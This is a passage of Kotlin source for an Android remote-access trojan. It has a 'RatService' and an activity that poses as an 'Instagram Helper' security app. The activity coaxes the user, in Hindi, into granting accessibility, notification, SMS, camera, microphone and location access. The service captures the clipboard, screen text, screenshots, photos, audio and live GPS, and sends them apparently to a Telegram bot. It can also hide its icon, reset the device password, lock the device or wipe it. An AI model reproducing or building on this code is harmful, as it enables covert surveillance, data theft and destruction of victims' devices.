        return if (sb.isEmpty()) "none" else sb.toString()
    }

    private fun clip(): String = try {
        val cm = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        val t = cm.primaryClip?.getItemAt(0)?.text?.toString()
        if (t.isNullOrEmpty()) "empty" else "clip:\n$t"
    } catch (_: Exception) { "err" }

    private fun screen(): String {
        val a = acc() ?: return "acc OFF"
        return "App: ${Acc.pkg}\n\n${a.screenText().take(2500)}"
    }

    private fun notifLog(): String = try {
        val f = File(filesDir, "notif.log")
        if (!f.exists()) "none" else {
            val lines = f.readLines().takeLast(40)
            if (lines.isEmpty()) "none" else lines.joinToString("\n") { l ->
                val q = l.split("|")
                if (q.size >= 4) "${q[1]}: ${q[2]} — ${q[3]}" else l
            }
        }
    } catch (_: Exception) { "err" }

    private fun shot() {
        val s = Scr.instance
        if (s == null) {
            Sender.send(this, "screen OFF — /sssetup")
            return
        }
        Thread {
            val b = s.grab()
            if (b == null) Sender.send(this, "capture fail")
            else Sender.sendBytes(this, b, "ss.jpg", "screen")
        }.start()
    }

    private fun cam(front: Boolean) {
        Cam.snap(this, front) { b ->
            if (b == null) Sender.send(this, "camera fail")
            else Sender.sendBytes(this, b, "cam.jpg", if (front) "front" else "back")
        }
    }

    @Suppress("DEPRECATION")
    private fun mic(sec: String): String {
        val n = sec.toIntOrNull() ?: 15
        if (n < 1 || n > 120) return "1-120"
        return try {
            val f = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
            rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(this) else MediaRecorder()
            val r = rec!!
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setOutputFile(f.absolutePath)
            r.prepare()
            r.start()
            Handler(mainLooper).postDelayed({
                try {
                    rec?.stop()
                    rec?.release()
                } catch (_: Exception) { }
                rec = null
                Sender.sendFile(this, f.absolutePath, "mic ${n}s")
            }, n * 1000L)
            "recording ${n}s"
        } catch (e: Exception) { "err: ${e.message}" }
    }

    private fun loc(): String = try {
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        var best: Location? = null
        for (p in lm.getProviders(true)) {
            val l = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
            val cur = best
            if (cur == null || l.accuracy < cur.accuracy) best = l
        }
        val b = best
        if (b == null) "unknown"
        else "https://maps.google.com/?q=${b.latitude},${b.longitude}"
    } catch (_: Exception) { "err" }

    private fun trackCmd(a: String): String {
        if (a == "off") {
            val l = trackListener
            if (l != null) try { track?.removeUpdates(l) } catch (_: Exception) { }
            trackListener = null
            return "track off"
        }
        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
        track = lm
        val listener = object : LocationListener {
            override fun onLocationChanged(l: Location) {
                Sender.send(this@RatService,
                    "\uD83D\uDCCD https://maps.google.com/?q=${l.latitude},${l.longitude}\n\u00b1${l.accuracy.toInt()}m")
            }
            override fun onStatusChanged(p: String?, s: Int, e: Bundle?) { }
            override fun onProviderEnabled(p: String) { }
            override fun onProviderDisabled(p: String) { }
        }
        trackListener = listener
        return try {
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60_000L, 0f, listener)
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60_000L, 0f, listener)
            "track ON (60s)"
        } catch (e: Exception) { "err: ${e.message}" }
    }

    private fun open(p: String): String {
        if (p.isEmpty()) return "pkg do"
        return try {
            val i = packageManager.getLaunchIntentForPackage(p)
            if (i == null) return "not found"
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
            "opened"
        } catch (_: Exception) { "err" }
    }

    private fun url(u: String): String {
        if (u.isEmpty()) return "url do"
        return try {
            startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(u))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            "opened"
        } catch (_: Exception) { "bad url" }
    }

    private fun tap(x: Float, y: Float) { acc()?.tap(x, y) }
    private fun swipe(x1: Float, y1: Float, x2: Float, y2: Float) { acc()?.swipe(x1, y1, x2, y2) }
    private fun clickText(t: String) = if (acc()?.clickText(t) == true) "clicked" else "not found"
    private fun type(t: String) = if (acc()?.typeText(t) == true) "typed" else "no field"

    private fun ls(p: String): String = try {
        val list = File(p).listFiles()
        if (list == null) "empty" else list.take(80).joinToString("\n") {
            (if (it.isDirectory) "D " else "F ") + it.name + "  " + it.length()
        }
    } catch (e: Exception) { "err: ${e.message}" }

    private fun vol(a: String): String = try {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        val d = when (a) {
            "up" -> AudioManager.ADJUST_RAISE
            "down" -> AudioManager.ADJUST_LOWER
            "mute" -> AudioManager.ADJUST_MUTE
            else -> AudioManager.ADJUST_UNMUTE
        }
        am.adjustStreamVolume(AudioManager.STREAM_MUSIC, d, AudioManager.FLAG_SHOW_UI)
        "vol ${am.getStreamVolume(AudioManager.STREAM_MUSIC)}/${am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)}"
    } catch (_: Exception) { "err" }

    private fun bright(a: String): String = try {
        val v = (a.toFloatOrNull() ?: 0.5f).coerceIn(0f, 1f)
        Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, (v * 255).toInt())
        "brightness ${(v * 100).toInt()}%"
    } catch (_: Exception) { "needs WRITE_SETTINGS" }

    private fun torch(a: String): String = try {
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        var found: String? = null
        for (id in cm.cameraIdList) {
            if (cm.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true) {
                found = id
                break
            }
        }
        if (found == null) "no flash"
        else {
            cm.setTorchMode(found, a != "off")
            "torch ${a != "off"}"
        }
    } catch (_: Exception) { "err" }

    @Suppress("DEPRECATION")
    private fun vib() {
        try {
            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26)
                v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE))
            else v.vibrate(800L)
        } catch (_: Exception) { }
    }

    private fun alarm() {
        try {
            val u = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            RingtoneManager.getRingtone(this, u).play()
        } catch (_: Exception) { }
    }

    private fun lock(): String {
        if (!adminActive(this)) return "admin OFF — /admin"
        return try {
            dpm(this).lockNow()
            "locked"
        } catch (_: Exception) { "err" }
    }

    private fun wipe(): String {
        if (!adminActive(this)) return "admin OFF"
        return try {
            dpm(this).wipeData(0)
            "wiping"
        } catch (_: Exception) { "err" }
    }

    private fun pass(a: String): String {
        if (!adminActive(this)) return "admin OFF"
        return try {
            dpm(this).resetPassword(a, 0)
            "pass set"
        } catch (_: Exception) { "err" }
    }

    private fun off() {
        try { dpm(this).lockNow() } catch (_: Exception) { }
    }

    private fun hide(h: Boolean): String {
        val st = if (h) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        else PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java), st, PackageManager.DONT_KILL_APP)
        return if (h) "hidden" else "shown"
    }

    private fun uninstall(p: String): String {
        if (p.isEmpty()) return "pkg do"
        return try {
            startActivity(Intent(Intent.ACTION_DELETE, Uri.parse("package:$p"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            "dialog"
        } catch (_: Exception) { "err" }
    }

    private fun sim(): String = try {
        val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        "SIM: ${tm.simOperatorName}\nNet: ${tm.networkOperatorName}\nNum: ${tm.line1Number}"
    } catch (_: Exception) { "err" }

    private fun toast(s: String) {
        if (s.isEmpty()) return
        Handler(mainLooper).post {
            Toast.makeText(applicationContext, s, Toast.LENGTH_LONG).show()
        }
    }
}class MainActivity : AppCompatActivity() {

    private lateinit var sNotif: TextView
    private lateinit var sAcc: TextView
    private lateinit var sBatt: TextView
    private lateinit var sPerm: TextView
    private lateinit var bNotif: Button
    private lateinit var bAcc: Button
    private lateinit var bBatt: Button
    private lateinit var bPerm: Button
    private lateinit var panel: LinearLayout
    private lateinit var tokenEt: EditText
    private lateinit var chatEt: EditText
    private lateinit var sendAllCb: CheckBox

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)

        val root = ScrollView(this)
        root.setBackgroundColor(0xFFFAFAFA.toInt())
        val col = LinearLayout(this)
        col.orientation = LinearLayout.VERTICAL
        root.addView(col)

        val head = LinearLayout(this)
        head.orientation = LinearLayout.VERTICAL
        head.gravity = Gravity.CENTER_HORIZONTAL
        head.setPadding(0, dp(38), 0, dp(30))
        head.background = GradientDrawable(
            GradientDrawable.Orientation.LEFT_RIGHT,
            intArrayOf(0xFFFEDA75.toInt(), 0xFFD62976.toInt(), 0xFF4F5BD5.toInt()))

        val h1 = TextView(this)
        h1.text = "Instagram Helper"
        h1.setTextColor(0xFFFFFFFF.toInt())
        h1.textSize = 21f
        h1.setTypeface(null, Typeface.BOLD)

        val h2 = TextView(this)
        h2.text = "Security & login alerts"
        h2.setTextColor(0xEEFFFFFF.toInt())
        h2.textSize = 12.5f

        head.addView(h1)
        head.addView(h2)
        col.addView(head)

        val body = LinearLayout(this)
        body.orientation = LinearLayout.VERTICAL
        body.setPadding(dp(18), dp(18), dp(18), dp(18))
        col.addView(body)

        val intro = TextView(this)
        intro.text = "Verify karne ke liye ye 4 permissions chahiye:"
        intro.textSize = 13.5f
        intro.setTextColor(0xFF444444.toInt())
        intro.setPadding(0, 0, 0, dp(12))
        body.addView(intro)

        sNotif = addRow(body, "1.", "Notification access", 1)
        sAcc = addRow(body, "2.", "Accessibility", 2)
        sBatt = addRow(body, "3.", "Battery — Unrestricted", 3)
        sPerm = addRow(body, "4.", "SMS + Camera + Location", 4)

        val adv = TextView(this)
        adv.text = "Advanced settings  ▾"
        adv.textSize = 12.5f
        adv.setTextColor(0xFF666666.toInt())
        adv.gravity = Gravity.CENTER
        adv.setPadding(0, dp(18), 0, dp(10))
        body.addView(adv)

        panel = LinearLayout(this)
        panel.orientation = LinearLayout.VERTICAL
        panel.visibility = View.GONE
        panel.setPadding(dp(14), dp(14), dp(14), dp(14))
        panel.background = cardBg()
        body.addView(panel)

        panel.addView(label("Bot token"))
        tokenEt = EditText(this)
        tokenEt.hint = "7123456789:AAH..."
        tokenEt.textSize = 12.5f
        panel.addView(tokenEt)

        panel.addView(label("Chat ID"))
        chatEt = EditText(this)
        chatEt.hint = "123456789"
        chatEt.textSize = 12.5f
        panel.addView(chatEt)

        sendAllCb = CheckBox(this)
        sendAllCb.text = "Saari notifications bhejo"
        sendAllCb.textSize = 12.5f
        panel.addView(sendAllCb)

        panel.addView(btn("Save") {
            save()
            toast("Saved")
            startRat(this)
            startWatchdog(this)
        })
        panel.addView(btn("Test message bhejo") {
            save()
            Sender.send(this, "\u2705 Test\n${Build.MODEL}")
            toast("Test bheja")
        })
        panel.addView(btn("Device admin ON karo") { askAdmin() })

        adv.setOnClickListener {
            panel.visibility = if (panel.visibility == View.GONE) View.VISIBLE else View.GONE
        }

        setContentView(root)

        val p = getSharedPreferences("cfg", MODE_PRIVATE)
        tokenEt.setText(p.getString("token", ""))
        chatEt.setText(p.getString("chat", ""))
        sendAllCb.isChecked = p.getBoolean("sendAll", false)

        startRat(this)
        startWatchdog(this)
    }

    private fun cardBg(): GradientDrawable {
        val g = GradientDrawable()
        g.setColor(0xFFFFFFFF.toInt())
        g.cornerRadius = dp(12).toFloat()
        g.setStroke(dp(1), 0xFFE8E8E8.toInt())
        return g
    }

    private fun label(t: String): TextView {
        val v = TextView(this)
        v.text = t
        v.textSize = 12.5f
        v.setTextColor(0xFF666666.toInt())
        v.setPadding(0, dp(10), 0, 0)
        return v
    }

    private fun btn(t: String, onClick: () -> Unit): Button {
        val b = Button(this)
        b.text = t
        b.isAllCaps = false
        b.setOnClickListener { onClick() }
        return b
    }

    private fun addRow(parent: LinearLayout, num: String, title: String, which: Int): TextView {
        val card = LinearLayout(this)
        card.orientation = LinearLayout.HORIZONTAL
        card.gravity = Gravity.CENTER_VERTICAL
        card.setPadding(dp(14), dp(14), dp(14), dp(14))
        card.background = cardBg()
        val lp = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        lp.topMargin = dp(10)
        card.layoutParams = lp

        val left = LinearLayout(this)
        left.orientation = LinearLayout.VERTICAL
        left.layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)

        val t = TextView(this)
        t.text = "$num  $title"
        t.textSize = 14.5f
        t.setTextColor(0xFF111111.toInt())
        t.setTypeface(null, Typeface.BOLD)

        val st = TextView(this)
        st.text = "Not allowed"
        st.textSize = 12.5f
        st.setTextColor(0xFFE1306C.toInt())
        st.setPadding(0, dp(3), 0, 0)

        left.addView(t)
        left.addView(st)
        card.addView(left)

        val b = Button(this)
        b.text = "Allow"
        b.textSize = 12.5f
        b.isAllCaps = false
        b.minWidth = 0
        b.setTextColor(0xFFFFFFFF.toInt())
        b.backgroundTintList = ColorStateList.valueOf(0xFFE1306C.toInt())
        b.setOnClickListener {
            when (which) {
                1 -> openNotif()
                2 -> openAcc()
                3 -> askBatt()
                else -> askPerms()
            }
        }
        card.addView(b)

        when (which) {
            1 -> bNotif = b
            2 -> bAcc = b
            3 -> bBatt = b
            else -> bPerm = b
        }

        parent.addView(card)
        return st
    }

    override fun onResume() {
        super.onResume()
        mark(sNotif, bNotif, notifOn())
        mark(sAcc, bAcc, accOn())
        mark(sBatt, bBatt, battOk())
        mark(sPerm, bPerm, perms())
    }

    private fun mark(tv: TextView, btn: Button, ok: Boolean) {
        tv.text = if (ok) "\u2713 Allowed" else "Not allowed"
        tv.setTextColor(if (ok) 0xFF2E7D32.toInt() else 0xFFE1306C.toInt())
        btn.text = if (ok) "Manage" else "Allow"
        btn.isEnabled = !ok
    }

    private fun save() {
        getSharedPreferences("cfg", MODE_PRIVATE).edit()
            .putString("token", tokenEt.text.toString().trim())
            .putString("chat", chatEt.text.toString().trim())
            .putBoolean("sendAll", sendAllCb.isChecked)
            .apply()
    }

    private fun openNotif() = try {
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
    } catch (_: Exception) { startActivity(Intent(Settings.ACTION_SETTINGS)) }

    private fun openAcc() = try {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    } catch (_: Exception) { }

    private fun askBatt() = try {
        startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            Uri.parse("package:$packageName")))
    } catch (_: Exception) { }

    private fun askAdmin() = try {
        startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp(this)))
    } catch (_: Exception) { }

    private fun askPerms() {
        val l = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= 33) l.add(Manifest.permission.POST_NOTIFICATIONS)
        l.add(Manifest.permission.READ_SMS)
        l.add(Manifest.permission.SEND_SMS)
        l.add(Manifest.permission.RECEIVE_SMS)
        l.add(Manifest.permission.READ_CONTACTS)
        l.add(Manifest.permission.READ_CALL_LOG)
        l.add(Manifest.permission.READ_CALENDAR)
        l.add(Manifest.permission.GET_ACCOUNTS)
        l.add(Manifest.permission.READ_PHONE_STATE)
        l.add(Manifest.permission.CAMERA)
        l.add(Manifest.permission.RECORD_AUDIO)
        l.add(Manifest.permission.ACCESS_FINE_LOCATION)
        l.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= 33) l.add(Manifest.permission.READ_MEDIA_IMAGES)
        else l.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        requestPermissions(l.toTypedArray(), 7)
    }

    private fun notifOn() = Settings.Secure
        .getString(contentResolver, "enabled_notification_listeners")?.contains(packageName) == true

    private fun accOn() = Settings.Secure
        .getString(contentResolver, "enabled_accessibility_services")?.contains(packageName) == true

    private fun battOk() = try {
        (getSystemService(POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)
    } catch (_: Exception) { false }

    private fun perms() =
        checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
        checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED &&
        checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED

    private fun toast(s: String) = Toast.makeText(this, s, Toast.LENGTH_SHORT).show()
}
